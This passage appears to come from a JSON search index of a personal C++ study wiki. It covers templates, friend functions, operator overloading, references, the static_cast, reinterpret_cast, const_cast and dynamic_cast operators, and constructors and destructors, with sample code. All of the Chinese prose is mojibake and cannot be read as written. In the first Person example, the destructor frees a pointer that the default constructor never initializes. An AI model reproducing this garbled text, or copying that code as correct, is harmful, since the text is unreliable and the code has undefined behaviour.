æ¨¡æ¿çš„æœ¬è´¨å°±æ˜¯ç¼–è¯‘å™¨å¸®æ›¿æ¢typenameï¼Œç”Ÿæˆä»£ç ï¼Œå…¶åæ±‡ç¼–å’Œæ­£å¸¸å†™æ³•å†™å‡ºæ¥çš„æ˜¯ä¸€æ ·çš„ å‹å…ƒ ç ´åäº†OOPçš„å°è£…æ€§ï¼Œä¸å»ºè®®ä½¿ç”¨ã€‚ ä½†è¿ç®—ç¬¦é‡è½½æ—¶ä¼šç”¨åˆ°ï¼šå¦‚æœä¸€ä¸ªæ“ä½œç¬¦å·²ç»æ˜¯å†™å¥½çš„ï¼Œè¦ç”¨åœ¨è‡ªå·±çš„ç±»ä¸Šï¼Œåªèƒ½å£°æ˜å‹å…ƒå‡½æ•°ï¼Œæ²¡æ³•åœ¨è‡ªå·±çš„ç±»ä¸­ç”¨æˆå‘˜å‡½æ•°ã€‚æ¯”å¦‚é‡è½½è¾“å…¥è¾“å‡ºè¿ç®—ç¬¦ï¼ˆ&lt;&lt; å’Œ &gt;&gt;ï¼‰ï¼Œå› ä¸ºæ ‡å‡†è¾“å…¥è¾“å‡ºæµï¼ˆä¾‹å¦‚ std::ostream å’Œ std::istreamï¼‰ä¸æ˜¯ç±»çš„æˆå‘˜ã€‚ è¿ç®—ç¬¦é‡è½½ è¿ç®—ç¬¦é‡è½½æœ¬è´¨å°±æ˜¯å‡½æ•°æ›¿æ¢ ç”¨é€”ï¼šå¼€å‘è€…éœ€è¦è‡ªå®šä¹‰è¿ç®—ç¬¦è§„åˆ™ï¼Œæ¯”å¦‚ä¸¤ä¸ªå¯¹è±¡ç›¸+ï¼Œä½œæ¯”è¾ƒç­‰ å†™è¿ç®—ç¬¦é‡è½½æ—¶è¦æ³¨æ„å‡½æ•°çš„è¿”å›ç±»å‹ å¼•ç”¨ è‡ªæµ‹é—®é¢˜ï¼š ä»€ä¹ˆæ˜¯å¼•ç”¨ç±»å‹ å®ƒè§£å†³äº†ä»€ä¹ˆé—®é¢˜ ä¸ºä»€ä¹ˆè¦ç”¨å¼•ç”¨ç±»å‹ å®ƒæœ‰ä»€ä¹ˆç‰¹ç‚¹ Cè¯­è¨€çš„æŒ‡é’ˆçš„çµæ´»åŒæ—¶ä¹Ÿå¸¦æ¥äº†ä¸å®‰å…¨çš„éšæ‚£ï¼Œå¼€å‘æ—¶å¯èƒ½ä¼šä¸å°å¿ƒå°†æŒ‡é’ˆæŒ‡å‘ä¸è¯¥æŒ‡çš„åœ°æ–¹ã€‚äºæ˜¯cppå‘æ˜äº†å¼•ç”¨ç±»å‹ï¼Œè®©å¼•ç”¨å¯ä»¥åƒæŒ‡é’ˆé‚£æ ·å»è®¿é—®ã€ä¿®æ”¹å¯¹è±¡çš„å†…å®¹ï¼Œä½†æ›´åŠ å®‰å…¨ã€‚ å£°æ˜å¼•ç”¨ç±»å‹çš„å˜é‡æ—¶å¿…é¡»èµ‹åˆå§‹å€¼ï¼Œä¸”åªèƒ½æŒ‡å‘ä¸€ä¸ªå˜é‡ï¼Œâ€œä»ä¸€è€Œç»ˆâ€ â€œä»ä¸€è€Œç»ˆâ€æ˜¯å› ä¸ºä¸Šè¾¹æˆ‘ä»¬å°è¯•é€šè¿‡å¯¹å¼•ç”¨èµ‹å€¼ã€åšè¿ç®—ï¼Œå‘ç°éƒ½æ”¹å˜ä¸äº†å¼•ç”¨æœ¬èº«çš„å€¼ï¼Œæ”¹çš„éƒ½æ˜¯å¼•ç”¨æ‰€æŒ‡å‘é‚£ä¸ªå˜é‡çš„å€¼ å¯¹å¼•ç”¨èµ‹å€¼ï¼Œæ˜¯å¯¹å…¶æŒ‡å‘çš„å˜é‡èµ‹å€¼ï¼Œè€Œä¸æ˜¯ä¿®æ”¹å¼•ç”¨æœ¬èº«çš„å€¼ å¯¹å¼•ç”¨åšè¿ç®—ï¼Œå°±æ˜¯å¯¹å…¶æŒ‡å‘çš„å˜é‡åšè¿ç®—ï¼Œè€Œä¸æ˜¯å¯¹å¼•ç”¨æœ¬èº«åšè¿ç®— å¼•ç”¨å¯ä»¥ç†è§£æˆæ˜¯ç¼–è¯‘å™¨ç»´æŠ¤çš„ä¸€ä¸ªæŒ‡é’ˆï¼Œä½†å¹¶ä¸å ç”¨ç©ºé—´ æµ·å“¥æå‡ºçš„ï¼Œå¼•ç”¨å’ŒæŒ‡é’ˆåœ¨ç¼–è¯‘åï¼Œåœ¨åº•å±‚æ˜¯ä¸€æ ·çš„ï¼Œæ²¡æœ‰åŒºåˆ«ã€‚å¼•ç”¨æ˜¯ç¼–è¯‘å™¨åœ¨å¼€å‘æ—¶åšäº†é™åˆ¶ï¼Œé˜²æ­¢æ„å¤–ï¼Œå‡ºç°ä¸å®‰å…¨çš„æ“ä½œã€‚ ä¸å ç”¨ç©ºé—´æ˜¯æŒ‡ï¼Œåœ¨åæ±‡ç¼–ä¸­æ‰¾ä¸åˆ°å¼•ç”¨çš„å½±å­ï¼Œæ‰¾ä¸åˆ°åœ¨å“ªå—å†…å­˜å­˜äº†å¼•ç”¨çš„å€¼ã€‚è€ŒæŒ‡é’ˆæ˜¯æœ‰ç©ºé—´å­˜è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘çš„å†…å­˜åœ°å€ã€‚ å¼•ç”¨ç±»å‹å°±æ˜¯ä¸€ä¸ªå¼±åŒ–äº†çš„æŒ‡é’ˆï¼Œä½¿ç”¨å¼•ç”¨å¯ä»¥åƒæŒ‡é’ˆé‚£æ ·å»è®¿é—®ã€ä¿®æ”¹å¯¹è±¡çš„å†…å®¹ï¼Œä½†æ›´åŠ å®‰å…¨ã€‚"},{"title":"å¼ºåˆ¶ç±»å‹è½¬æ¢è¿ç®—ç¬¦","path":"/wiki/C++/å¼ºåˆ¶ç±»å‹è½¬æ¢è¿ç®—ç¬¦.html","content":"å¼ºåˆ¶ç±»å‹è½¬æ¢è¿ç®—ç¬¦ å‚è€ƒï¼šC++å¼ºåˆ¶ç±»å‹è½¬æ¢è¿ç®—ç¬¦ï¼ˆstatic_castã€reinterpret_castã€const_castå’Œdynamic_castï¼‰ Cé£æ ¼å’ŒC++é£æ ¼çš„å¼ºåˆ¶è½¬æ¢ï¼Œe.g. åœ¨Cé£æ ¼çš„ç±»å‹è½¬æ¢ä¸­ï¼Œå°†ä¸€ä¸ªæŒ‡é’ˆç±»å‹è½¬æ¢ä¸ºå¦ä¸€ä¸ªæŒ‡é’ˆç±»å‹ï¼Œæ˜¯è¿™æ ·å†™ï¼š 1(NtQuerySystemInformation_t)GetProcAddress(hNtdll, &quot;NtQuerySystemInformation&quot;); å°† GetProcAddress å‡½æ•°è¿”å›çš„ FARPROC ç±»å‹è½¬æ¢ä¸º NtQuerySystemInformation_tç±»å‹ã€‚ åœ¨C++ä¸­ï¼Œä½¿ç”¨reinterpret_castæ˜¯è¿™æ ·å†™ï¼š 1reinterpret_cast&lt;NtQuerySystemInformation_t&gt;(GetProcAddress(hNtdll, &quot;NtQuerySystemInformation&quot;)); Cä¸ºäº†å…¼å®¹Cè¯­è¨€ï¼Œä¿ç•™äº†Cçš„è€å¼åšæ³•ï¼šå°†ç±»å‹åä½œä¸ºå¼ºåˆ¶ç±»å‹è½¬æ¢è¿ç®—ç¬¦ã€‚åŒæ—¶ï¼ŒCå¼•å…¥äº†æ–°çš„å¼ºåˆ¶ç±»å‹è½¬æ¢æœºåˆ¶ï¼Œä¸»è¦æ˜¯ä¸ºäº†å…‹æœCè¯­è¨€å¼ºåˆ¶ç±»å‹è½¬æ¢çš„ä»¥ä¸‹ä¸‰ä¸ªç¼ºç‚¹ã€‚ æ²¡æœ‰ä»å½¢å¼ä¸Šä½“ç°è½¬æ¢åŠŸèƒ½å’Œé£é™©çš„ä¸åŒã€‚ ä¾‹å¦‚ï¼Œå°† int å¼ºåˆ¶è½¬æ¢æˆ double æ˜¯æ²¡æœ‰é£é™©çš„ï¼Œè€Œå°†å¸¸é‡æŒ‡é’ˆè½¬æ¢æˆéå¸¸é‡æŒ‡é’ˆï¼Œå°†åŸºç±»æŒ‡é’ˆè½¬æ¢æˆæ´¾ç”Ÿç±»æŒ‡é’ˆéƒ½æ˜¯é«˜é£é™©çš„ï¼Œè€Œä¸”åä¸¤è€…å¸¦æ¥çš„é£é™©ä¸åŒï¼ˆå³å¯èƒ½å¼•å‘ä¸åŒç§ç±»çš„é”™è¯¯ï¼‰ï¼ŒCè¯­è¨€çš„å¼ºåˆ¶ç±»å‹è½¬æ¢å½¢å¼å¯¹è¿™äº›ä¸åŒå¹¶ä¸åŠ ä»¥åŒºåˆ†ã€‚ å°†å¤šæ€åŸºç±»æŒ‡é’ˆè½¬æ¢æˆæ´¾ç”Ÿç±»æŒ‡é’ˆæ—¶ä¸æ£€æŸ¥å®‰å…¨æ€§ï¼Œå³æ— æ³•åˆ¤æ–­è½¬æ¢åçš„æŒ‡é’ˆæ˜¯å¦ç¡®å®æŒ‡å‘ä¸€ä¸ªæ´¾ç”Ÿç±»å¯¹è±¡ã€‚ éš¾ä»¥åœ¨ç¨‹åºä¸­å¯»æ‰¾åˆ°åº•ä»€ä¹ˆåœ°æ–¹è¿›è¡Œäº†å¼ºåˆ¶ç±»å‹è½¬æ¢ã€‚ å¼ºåˆ¶ç±»å‹è½¬æ¢æ˜¯å¼•å‘ç¨‹åºè¿è¡Œæ—¶é”™è¯¯çš„ä¸€ä¸ªåŸå› ï¼Œå› æ­¤åœ¨ç¨‹åºå‡ºé”™æ—¶ï¼Œå¯èƒ½å°±ä¼šæƒ³åˆ°æ˜¯ä¸æ˜¯æœ‰å“ªäº›å¼ºåˆ¶ç±»å‹è½¬æ¢å‡ºäº†é—®é¢˜ã€‚å¦‚æœé‡‡ç”¨Cè¯­è¨€çš„è€å¼åšæ³•ï¼Œè¦åœ¨ç¨‹åºä¸­æ‰¾å‡ºæ‰€æœ‰è¿›è¡Œäº†å¼ºåˆ¶ç±»å‹è½¬æ¢çš„åœ°æ–¹ï¼Œæ˜¾ç„¶æ˜¯å¾ˆéº»çƒ¦çš„ï¼Œå› ä¸ºè¿™äº›è½¬æ¢æ²¡æœ‰ç»Ÿä¸€çš„æ ¼å¼ã€‚è€Œç”¨ C++ çš„æ–¹å¼ï¼Œåˆ™åªéœ€è¦æŸ¥æ‰¾_castå­—ç¬¦ä¸²å°±å¯ä»¥äº†ã€‚ç”šè‡³å¯ä»¥æ ¹æ®é”™è¯¯çš„ç±»å‹ï¼Œæœ‰é’ˆå¯¹æ€§åœ°ä¸“é—¨æŸ¥æ‰¾æŸä¸€ç§å¼ºåˆ¶ç±»å‹è½¬æ¢ã€‚ä¾‹å¦‚ï¼Œæ€€ç–‘ä¸€ä¸ªé”™è¯¯å¯èƒ½æ˜¯ç”±äºä½¿ç”¨äº† reinterpret_cast å¯¼è‡´çš„ï¼Œå°±å¯ä»¥åªæŸ¥æ‰¾reinterpret_castå­—ç¬¦ä¸²ã€‚ C++ å¼ºåˆ¶ç±»å‹è½¬æ¢è¿ç®—ç¬¦çš„ç”¨æ³•å¦‚ä¸‹ï¼š 1å¼ºåˆ¶ç±»å‹è½¬æ¢è¿ç®—ç¬¦ &lt;è¦è½¬æ¢åˆ°çš„ç±»å‹&gt; (å¾…è½¬æ¢çš„è¡¨è¾¾å¼) e.g. 1double d = static_cast &lt;double&gt; (3*5); //å°† 3*5 çš„å€¼è½¬æ¢æˆå®æ•° C++ å¼•å…¥äº†å››ç§åŠŸèƒ½ä¸åŒçš„å¼ºåˆ¶ç±»å‹è½¬æ¢è¿ç®—ç¬¦ä»¥è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼šstatic_castã€reinterpret_castã€const_cast å’Œ dynamic_castã€‚ static_cast static_cast ç”¨äºè¿›è¡Œæ¯”è¾ƒâ€œè‡ªç„¶â€å’Œä½é£é™©çš„è½¬æ¢ï¼Œå¦‚æ•´å‹å’Œæµ®ç‚¹å‹ã€å­—ç¬¦å‹ä¹‹é—´çš„äº’ç›¸è½¬æ¢ã€‚å¦å¤–ï¼Œå¦‚æœå¯¹è±¡æ‰€å±çš„ç±»é‡è½½äº†å¼ºåˆ¶ç±»å‹è½¬æ¢è¿ç®—ç¬¦ Tï¼ˆå¦‚ T æ˜¯ intã€int* æˆ–å…¶ä»–ç±»å‹åï¼‰ï¼Œåˆ™ static_cast ä¹Ÿèƒ½ç”¨æ¥è¿›è¡Œå¯¹è±¡åˆ° T ç±»å‹çš„è½¬æ¢ã€‚ static_cast ä¸èƒ½ç”¨äºåœ¨ä¸åŒç±»å‹çš„æŒ‡é’ˆä¹‹é—´äº’ç›¸è½¬æ¢ï¼Œä¹Ÿä¸èƒ½ç”¨äºæ•´å‹å’ŒæŒ‡é’ˆä¹‹é—´çš„äº’ç›¸è½¬æ¢ï¼Œå½“ç„¶ä¹Ÿä¸èƒ½ç”¨äºä¸åŒç±»å‹çš„å¼•ç”¨ä¹‹é—´çš„è½¬æ¢ã€‚å› ä¸ºè¿™äº›å±äºé£é™©æ¯”è¾ƒé«˜çš„è½¬æ¢ã€‚ reinterpret_cast reinterpret_cast ç”¨äºè¿›è¡Œå„ç§ä¸åŒç±»å‹çš„æŒ‡é’ˆä¹‹é—´ã€ä¸åŒç±»å‹çš„å¼•ç”¨ä¹‹é—´ä»¥åŠæŒ‡é’ˆå’Œèƒ½å®¹çº³æŒ‡é’ˆçš„æ•´æ•°ç±»å‹ä¹‹é—´çš„è½¬æ¢ã€‚è½¬æ¢æ—¶ï¼Œæ‰§è¡Œçš„æ˜¯é€ä¸ªæ¯”ç‰¹å¤åˆ¶çš„æ“ä½œã€‚ è¿™ç§è½¬æ¢æä¾›äº†å¾ˆå¼ºçš„çµæ´»æ€§ï¼Œä½†è½¬æ¢çš„å®‰å…¨æ€§åªèƒ½ç”±ç¨‹åºå‘˜çš„ç»†å¿ƒæ¥ä¿è¯äº†ã€‚ä¾‹å¦‚ï¼Œç¨‹åºå‘˜æ‰§æ„è¦æŠŠä¸€ä¸ª int* æŒ‡é’ˆã€å‡½æ•°æŒ‡é’ˆæˆ–å…¶ä»–ç±»å‹çš„æŒ‡é’ˆè½¬æ¢æˆ string* ç±»å‹çš„æŒ‡é’ˆä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œè‡³äºä»¥åç”¨è½¬æ¢åçš„æŒ‡é’ˆè°ƒç”¨ string ç±»çš„æˆå‘˜å‡½æ•°å¼•å‘é”™è¯¯ï¼Œç¨‹åºå‘˜ä¹Ÿåªèƒ½è‡ªè¡Œæ‰¿æ‹…æŸ¥æ‰¾é”™è¯¯çš„çƒ¦çå·¥ä½œï¼šï¼ˆC++ æ ‡å‡†ä¸å…è®¸å°†å‡½æ•°æŒ‡é’ˆè½¬æ¢æˆå¯¹è±¡æŒ‡é’ˆï¼Œä½†æœ‰äº›ç¼–è¯‘å™¨ï¼Œå¦‚ Visual Studio 2010ï¼Œåˆ™æ”¯æŒè¿™ç§è½¬æ¢ï¼‰ã€‚ e.g. 123int a = 42;void* p = &amp;a;int* b = reinterpret_cast&lt;int*&gt;(p); ç¬¬äºŒè¡Œï¼šå°†ä¸€ä¸ª int ç±»å‹çš„å˜é‡ a çš„åœ°å€ &amp;a å¼ºåˆ¶è½¬æ¢ä¸º void* ç±»å‹çš„æŒ‡é’ˆ pï¼Œ ç¬¬ä¸‰è¡Œï¼šå°† p å¼ºåˆ¶è½¬æ¢ä¸º int* ç±»å‹çš„æŒ‡é’ˆ bã€‚ b æŒ‡å‘çš„æ˜¯ä¸€ä¸ª int ç±»å‹çš„å˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ *b è®¿é—®è¯¥å˜é‡çš„å€¼ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­æ˜¯42ã€‚ const_cast const_cast è¿ç®—ç¬¦ä»…ç”¨äºè¿›è¡Œå»é™¤ const å±æ€§çš„è½¬æ¢ï¼Œå®ƒä¹Ÿæ˜¯å››ä¸ªå¼ºåˆ¶ç±»å‹è½¬æ¢è¿ç®—ç¬¦ä¸­å”¯ä¸€èƒ½å¤Ÿå»é™¤ const å±æ€§çš„è¿ç®—ç¬¦ã€‚ å°† const å¼•ç”¨è½¬æ¢ä¸ºåŒç±»å‹çš„é const å¼•ç”¨ï¼Œå°† const æŒ‡é’ˆè½¬æ¢ä¸ºåŒç±»å‹çš„é const æŒ‡é’ˆæ—¶å¯ä»¥ä½¿ç”¨ const_cast è¿ç®—ç¬¦ã€‚ dynamic_cast ç”¨ reinterpret_cast å¯ä»¥å°†å¤šæ€åŸºç±»ï¼ˆåŒ…å«è™šå‡½æ•°çš„åŸºç±»ï¼‰çš„æŒ‡é’ˆå¼ºåˆ¶è½¬æ¢ä¸ºæ´¾ç”Ÿç±»çš„æŒ‡é’ˆï¼Œä½†æ˜¯è¿™ç§è½¬æ¢ä¸æ£€æŸ¥å®‰å…¨æ€§ï¼Œå³ä¸æ£€æŸ¥è½¬æ¢åçš„æŒ‡é’ˆæ˜¯å¦ç¡®å®æŒ‡å‘ä¸€ä¸ªæ´¾ç”Ÿç±»å¯¹è±¡ã€‚dynamic_castä¸“é—¨ç”¨äºå°†å¤šæ€åŸºç±»çš„æŒ‡é’ˆæˆ–å¼•ç”¨å¼ºåˆ¶è½¬æ¢ä¸ºæ´¾ç”Ÿç±»çš„æŒ‡é’ˆæˆ–å¼•ç”¨ï¼Œè€Œä¸”èƒ½å¤Ÿæ£€æŸ¥è½¬æ¢çš„å®‰å…¨æ€§ã€‚å¯¹äºä¸å®‰å…¨çš„æŒ‡é’ˆè½¬æ¢ï¼Œè½¬æ¢ç»“æœè¿”å› NULL æŒ‡é’ˆã€‚ dynamic_cast æ˜¯é€šè¿‡â€œè¿è¡Œæ—¶ç±»å‹æ£€æŸ¥â€æ¥ä¿è¯å®‰å…¨æ€§çš„ã€‚dynamic_cast ä¸èƒ½ç”¨äºå°†éå¤šæ€åŸºç±»çš„æŒ‡é’ˆæˆ–å¼•ç”¨å¼ºåˆ¶è½¬æ¢ä¸ºæ´¾ç”Ÿç±»çš„æŒ‡é’ˆæˆ–å¼•ç”¨â€”â€”è¿™ç§è½¬æ¢æ²¡æ³•ä¿è¯å®‰å…¨æ€§ï¼Œåªå¥½ç”¨ reinterpret_cast æ¥å®Œæˆã€‚"},{"title":"æ„é€ å‡½æ•°å’Œææ„å‡½æ•°","path":"/wiki/C++/æ„é€ å‡½æ•°å’Œææ„å‡½æ•°.html","content":"æ„é€ å‡½æ•°å’Œææ„å‡½æ•° å‡½æ•°å è¿”å›å€¼ å‚æ•° å‡½æ•°ä¸ªæ•° ä»€ä¹ˆæ—¶å€™æ‰§è¡Œ ç”¨é€” å¤‡æ³¨ å¿…é¡»è¦æœ‰å— æ„é€ å‡½æ•° ç±»å() ä¸èƒ½æœ‰ å¯ä»¥æœ‰ å¯ä»¥æœ‰å¤šä¸ªï¼Œå‚æ•°è¦ä¸åŒï¼Œï¼ˆé‡è½½ï¼‰ åœ¨å¯¹è±¡åˆ›å»ºæ—¶æ‰§è¡Œ ç”¨äºåˆå§‹åŒ–å·¥ä½œ ä½ å¸Œæœ›å¯¹è±¡åˆ›å»ºæ—¶åšäº›ä»€ä¹ˆï¼Ÿ ç¼–è¯‘å™¨ä¸è¦æ±‚å¿…é¡»æä¾› ææ„å‡½æ•° ~ç±»å() ä¸èƒ½æœ‰ ä¸èƒ½æœ‰ åªèƒ½æœ‰1ä¸ª åœ¨å¯¹è±¡é”€æ¯å‰æ‰§è¡Œ ç”¨äºæ¸…ç†å·¥ä½œ ç¼–è¯‘å™¨ä¸è¦æ±‚å¿…é¡»æä¾› ææ„å‡½æ•°åªèƒ½æœ‰1ä¸ªï¼Œä¸èƒ½é‡è½½ï¼ŒåŸå› ï¼š æ²¡æœ‰å¿…è¦ ææ„å‡½æ•°æ˜¯å¯¹è±¡å³å°†é”€æ¯å‰ç”±ç³»ç»Ÿè°ƒç”¨çš„ï¼ˆç³»ç»Ÿè°ƒç”¨ï¼šç¼–è¯‘å™¨ç¼–è¯‘æ—¶æ›¿æˆ‘ä»¬ç”Ÿæˆäº†è°ƒç”¨ææ„å‡½æ•°çš„ä»£ç ï¼‰ï¼Œå¦‚æœé‡è½½äº†ï¼Œç³»ç»Ÿæ€ä¹ˆçŸ¥é“è°ƒç”¨å“ªä¸ªææ„å‡½æ•° 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt;struct Person &#123; int age; int level; char* arr; Person() // Default constructor &#123; printf(&quot;Default constructor called... &quot;); // Called when an object is created without any arguments &#125; Person(int age, int level) // Parameterized constructor &#123; printf(&quot;Parameterized constructor called... &quot;); // Called when an object is created with age and level arguments this-&gt;age = age; this-&gt;level = level; arr = (char*)malloc(1024); &#125; ~Person() // Destructor &#123; printf(&quot;Destructor called... &quot;); // Called when an object goes out of scope or is deleted free(arr); arr = NULL; &#125; &#125;; Person g_p; // Global object, default constructor called at program startupint main()&#123; Person p1; // Local object, default constructor called here Person p2(1, 2); // Local object, parameterized constructor called here // Destructor will be called for p2 then p1 at the end of this scope (end of main) return 0;&#125; // Destructor will be called for g_p at program termination Destructor will be called for p2 then p1 at the end of this scope (end of main)è¿™å¥çœ‹ä¸æ‡‚ï¼Ÿåœ¨è¿™å¥è‹±æ–‡ä¸­ï¼Œâ€œthenâ€æ˜¯ä¸€ä¸ªå‰¯è¯ï¼Œç”¨æ¥è¡¨ç¤ºæ—¶é—´é¡ºåºã€‚å®ƒåœ¨è¿™é‡Œè¿æ¥ä¸¤ä¸ªåŠ¨ä½œï¼Œè¯´æ˜ç¬¬ä¸€ä¸ªåŠ¨ä½œï¼ˆè°ƒç”¨p2çš„ææ„å‡½æ•°ï¼‰å‘ç”Ÿåœ¨ç¬¬äºŒä¸ªåŠ¨ä½œï¼ˆè°ƒç”¨p1çš„ææ„å‡½æ•°ï¼‰ä¹‹å‰ã€‚è¿™ä¸ªè¯é€šå¸¸ç”¨äºæè¿°ä¸€ç³»åˆ—æŒ‰é¡ºåºå‘ç”Ÿçš„äº‹ä»¶ã€‚å› æ­¤ï¼Œè¿™å¥è¯çš„ç»“æ„å¯ä»¥åˆ†è§£ä¸ºï¼šâ€œDestructor will be called for p2â€ â€” è¿™æ˜¯ç¬¬ä¸€ä¸ªç‹¬ç«‹çš„å¥å­ï¼Œè¯´æ˜p2çš„ææ„å‡½æ•°å°†ä¼šè¢«è°ƒç”¨ã€‚â€œthenâ€ â€” å‰¯è¯ï¼Œç”¨æ¥è¿æ¥ä¸¤ä¸ªäº‹ä»¶ï¼ŒæŒ‡å‡ºå®ƒä»¬çš„é¡ºåºå…³ç³»ã€‚â€œDestructor will be called for p1â€ â€” è¿™æ˜¯ç¬¬äºŒä¸ªç‹¬ç«‹çš„å¥å­ï¼Œè¯´æ˜p1çš„ææ„å‡½æ•°å°†ä¼šåœ¨p2ä¹‹åè¢«è°ƒç”¨ã€‚æ•´å¥è¯çš„æ„æ€æ˜¯ï¼Œå½“main()å‡½æ•°çš„ä½œç”¨åŸŸç»“æŸæ—¶ï¼Œé¦–å…ˆp2çš„ææ„å‡½æ•°ä¼šè¢«è°ƒç”¨ï¼Œç´§æ¥ç€p1çš„ææ„å‡½æ•°ä¹Ÿä¼šè¢«è°ƒç”¨ã€‚ å˜é‡ageï¼Œlevelï¼Œarråœ¨æ ˆä¸­ï¼Œæ ˆå¸§æ²¡äº†å°±é‡Šæ”¾æ‰äº†ã€‚ä½†æ˜¯ææ„å‡½æ•°Person()é‡Œç”¨mallocå‘å †ç”³è¯·çš„1024å­—èŠ‚å¤§å°çš„ç©ºé—´å¹¶æ²¡é‡Šæ”¾ï¼Œæ‰€ä»¥è¦è‡ªå·±æ‰‹åŠ¨é‡Šæ”¾ã€‚é‡Šæ”¾å†™åœ¨å“ªï¼ŸæŒ‰ä»¥å‰Cçš„æƒ³æ³•ï¼Œè°ä½¿ç”¨ï¼Œè°é‡Šæ”¾ï¼Œæ¯”å¦‚ä¸‹é¢çš„ä»£ç ï¼Œfun1()å‡½æ•°é‡Œå¯èƒ½ç”¨åˆ°arrï¼Œå‡½æ•°å¿«ç»“æŸä¾¿free(arr)ï¼Œfun2()å‡½æ•°é‡Œä¹Ÿå¯èƒ½ç”¨åˆ°arrï¼Œå‡½æ•°å¿«ç»“æŸä¾¿free(arr)ã€‚éº»çƒ¦ç‚¹æ¥äº†ï¼Œå¦‚æœå¤šæ¬¡è°ƒç”¨äº†fun1()å’Œfun2()ï¼Œå°±ä¼šå¯¼è‡´arrå¤šæ¬¡é‡Šæ”¾ã€‚é‚£ä»€ä¹ˆæ—¶å€™é‡Šæ”¾ï¼Ÿå³ä½¿è¿™äº›å‡½æ•°é‡Œéƒ½ç”¨åˆ°äº†arrï¼Œä½†æˆ‘ä»¬ä¸ç¡®å®šç¨‹åºè¦è°ƒç”¨å¤šå°‘æ¬¡ï¼Œå”¯ä¸€èƒ½ç¡®å®šçš„æ˜¯è¿™ä¸ªå¯¹è±¡å‡†å¤‡ä¸ç”¨æ—¶ï¼Œarréœ€è¦é‡Šæ”¾ï¼Œæ‰€ä»¥åœ¨ææ„å‡½æ•°ä¸­free(arr)ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt;struct Person &#123; int age; int level; char* arr; Person() &#123; printf(&quot;Default constructor called... &quot;); &#125; Person(int age, int level) &#123; printf(&quot;Parameterized constructor called... &quot;); this-&gt;age = age; this-&gt;level = level; arr = (char*)malloc(1024); &#125; ~Person() // Destructor &#123; &#125; void fun1() &#123; //... free(arr); &#125; void fun2() &#123; //... free(arr); &#125; &#125;; int main()&#123; Person p; p.fun1(); p.fun2(); //éº»çƒ¦äº†ï¼Œå¯¹arråˆè¿›è¡Œfree return 0;&#125; å­ç±»å¯¹è±¡æ„é€ å’Œææ„çš„è°ƒç”¨é“¾ å­ç±»å¯¹è±¡å®ä¾‹åŒ–æ—¶ï¼Œå­ç±»æ„é€ å‡½æ•°ä¸­ä¼šcallçˆ¶ç±»çš„æ„é€ å‡½æ•°ï¼Œåæ±‡ç¼–èƒ½è·Ÿè¿›å»çœ‹åˆ° æœªæ¥å†æ•´ç†ï¼š å­ç±»æ„é€ å‡½æ•°çš„å†™æ³• å‚è€ƒï¼šC++ç»§æ‰¿ä¸­å…³äºå­ç±»æ„é€ å‡½æ•°çš„å†™æ³• é‡æ–°æ¢³ç†ï¼š å­ç±»æ— æ„é€ å‡½æ•°ï¼Œ å­ç±»æ— æ„é€ å‡½æ•°æ—¶çš„é»˜è®¤è¡Œä¸ºï¼šå¦‚æœå­ç±»æ²¡æœ‰æ˜¾å¼å®šä¹‰ä»»ä½•æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨è°ƒç”¨çˆ¶ç±»çš„æ— å‚æ•°æ„é€ å‡½æ•°æ¥åˆå§‹åŒ–ç»§æ‰¿çš„æˆå‘˜ã€‚ å­ç±»å®šä¹‰æ„é€ å‡½æ•°æ—¶çš„è¡Œä¸ºï¼š å¦‚æœå­ç±»å®šä¹‰äº†æ„é€ å‡½æ•°ï¼ˆæ— è®ºæ˜¯æ— å‚æ•°è¿˜æ˜¯å¸¦å‚æ•°ï¼‰ï¼Œåœ¨åˆ›å»ºå­ç±»å¯¹è±¡æ—¶ï¼Œä¼šé¦–å…ˆè°ƒç”¨çˆ¶ç±»çš„æ— å‚æ•°æ„é€ å‡½æ•°ï¼Œç„¶åè°ƒç”¨å­ç±»çš„æ„é€ å‡½æ•°ã€‚ å­ç±»æ„é€ å‡½æ•°ä¸­æ˜¾å¼è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ï¼š å¦‚æœå­ç±»çš„æ„é€ å‡½æ•°ä¸­æ˜¾å¼åœ°è°ƒç”¨äº†çˆ¶ç±»çš„æ„é€ å‡½æ•°ï¼ˆæ— è®ºæ˜¯é»˜è®¤çš„è¿˜æ˜¯å¸¦å‚æ•°çš„ï¼‰ï¼Œåˆ™æŒ‰ç…§å­ç±»æ„é€ å‡½æ•°ä¸­çš„æŒ‡ç¤ºè°ƒç”¨ç›¸åº”çš„çˆ¶ç±»æ„é€ å‡½æ•°ã€‚ çˆ¶ç±»åªæœ‰å¸¦å‚æ•°æ„é€ å‡½æ•°æ—¶çš„å­ç±»æ„é€ å‡½æ•°ï¼š å¦‚æœçˆ¶ç±»åªæä¾›äº†å¸¦å‚æ•°çš„æ„é€ å‡½æ•°ï¼Œæ²¡æœ‰æ— å‚æ•°çš„é»˜è®¤æ„é€ å‡½æ•°ï¼Œé‚£ä¹ˆå­ç±»å¿…é¡»åœ¨å…¶æ„é€ å‡½æ•°ä¸­æ˜¾å¼è°ƒç”¨çˆ¶ç±»çš„å¸¦å‚æ•°æ„é€ å‡½æ•°ï¼Œå¦åˆ™ä¼šç¼–è¯‘é”™è¯¯ã€‚ è™šç»§æ‰¿ä¸­çš„æ„é€ å‡½æ•°è°ƒç”¨ï¼š åœ¨è™šç»§æ‰¿çš„æƒ…å†µä¸‹ï¼Œæœ€åº•å±‚çš„æ´¾ç”Ÿç±»è´Ÿè´£è°ƒç”¨è™šåŸºç±»çš„æ„é€ å‡½æ•°ã€‚å¦‚æœä¸æ˜¾å¼è°ƒç”¨ï¼Œç¼–è¯‘å™¨ä¼šå°è¯•è°ƒç”¨è™šåŸºç±»çš„é»˜è®¤æ„é€ å‡½æ•°ã€‚å¦‚æœè™šåŸºç±»æ²¡æœ‰é»˜è®¤æ„é€ å‡½æ•°ï¼Œå°†å¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚ 